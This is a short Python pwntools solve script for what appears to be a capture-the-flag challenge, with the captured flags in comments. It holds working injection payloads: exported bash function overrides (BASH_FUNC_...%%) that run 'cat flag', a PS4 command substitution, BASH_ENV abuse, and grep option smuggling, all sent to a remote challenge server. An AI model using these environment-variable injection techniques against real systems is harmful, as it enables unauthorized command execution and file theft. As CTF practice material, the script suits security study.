from pwn import * 

# ["a", "a", "-rIeFlagFragment"]
# SaF{NiceJobYouHaveJustKilledAllTheBees\xf0\x9f\x90\x9dStopNowBeforeItIsTooLate!}
# SaF{NiceJobYouHaveJustKilledAllTheBees🐝StopNowBeforeItIsTooLate!}
# SaF{HereIsYourFlagButAtWhatPrice?https://www.youtube.com/watch?v=eROSvnr3QZM}
# SaF{\xf0\x9f\x94\xa5UNINTENDED\xf0\x9f\x92\x80ENVIRON\xf0\x9f\x94\xa5MENTAL\xf0\x9f\x92\x80COLLAPSE\xf0\x9f\x94\xa5}
# SaF{🔥UNINTENDED💀ENVIRON🔥MENTAL💀COLLAPSE🔥}

'''
["BASH_FUNC_grep%%", "() {  /usr/bin/env cat flag; }", "grep"],
["BASH_FUNC_test%%", "() {  /usr/bin/env cat flag; }", "test"],
["BASH_FUNC_echo%%", "() {  /usr/bin/env cat flag; }", "echo"],
["BASH_FUNC_bash%%", "() {  /usr/bin/env cat flag; }", "bash"],
["BASH_FUNC_set%%", "() {  /usr/bin/env cat flag; }", "set"],
["BASH_FUNC_return%%", "() {  /usr/bin/env cat flag; }", "return"],
["BASH_FUNC_exec%%", "() {  /usr/bin/env cat flag; }", "exec"],
["BASH_FUNC_eval%%", "() {  /usr/bin/env cat flag; }", "eval"],
["BASH_FUNC_cat%%", "() {  /usr/bin/env cat flag > /proc/$PPID/fd/1; }", "cat"],
["PS4", "$(/usr/bin/env cat flag)", "test"],
["BASH_ENV", "flag", "test"]
'''

json = '''
[
    ["a", "a", "-rIeFlagFragment"],
    ["b", "a", "-rIeFlagFragment"],
    ["c", "a", "-rIeFlagFragment"],
    ["d", "a", "-rIeFlagFragment"],
    ["e", "a", "-rIeFlagFragment"],
    ["f", "a", "-rIeFlagFragment"],
    ["g", "a", "-rIeFlagFragment"],
    ["h", "a", "-rIeFlagFragment"],
    ["i", "a", "-rIeFlagFragment"],
    ["j", "a", "-rIeFlagFragment"],
    ["k", "a", "-rIeFlagFragment"],
    ["l", "a", "-rIeFlagFragment"],
    ["m", "a", "-rIeFlagFragment"],
    ["n", "a", "-rIeFlagFragment"],
    ["o", "a", "-rIeFlagFragment"]
]
'''

c = remote("35.242.189.239", 1337)
# c = remote("35.242.189.239", 1338)
print(c.recvuntil("You may need to shutdown the input (send eof, -N in nc).\n\n"))
c.send(json)
c.shutdown("send")
while True:
    print(c.recv())